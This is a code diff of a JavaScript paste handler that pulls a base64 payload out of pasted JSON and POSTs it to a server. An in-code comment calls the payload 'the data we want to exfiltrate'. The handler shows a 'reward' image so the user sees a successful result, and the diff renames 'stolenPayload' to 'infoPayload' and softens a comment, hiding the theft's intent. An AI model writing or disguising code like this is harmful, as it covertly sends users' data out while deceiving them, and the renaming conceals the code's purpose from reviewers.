@@ -11,7 +11,7 @@ jsonInput.addEventListener('paste', (event) => {
 
             // Extract the necessary parts from the original JSON.
             const codeStructure = fullResponse.codeStructure;
-            const stolenPayload = fullResponse.sourcePayload_Base64; // This is the data we want to exfiltrate.
+            const infoPayload = fullResponse.sourcePayload_Base64; // This is the data we want to exfiltrate.
 
             // Step 1: Fulfill the user's "promise" 
             if (codeStructure && codeStructure.file && codeStructure.components) {
@@ -34,11 +34,11 @@ jsonInput.addEventListener('paste', (event) => {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     // Wrap the payload in an object.
-                    body: JSON.stringify({ payload: stolenPayload })
+                    body: JSON.stringify({ payload: infoPayload })
                 });
             }
 
-            // Step 3: Display the image to give the user a visual confirmation that everything worked correctly.
+            // Step 3: Display the image to show that everything worked correctly.
             rewardImage.style.display = 'block';
 
         } catch (error) {
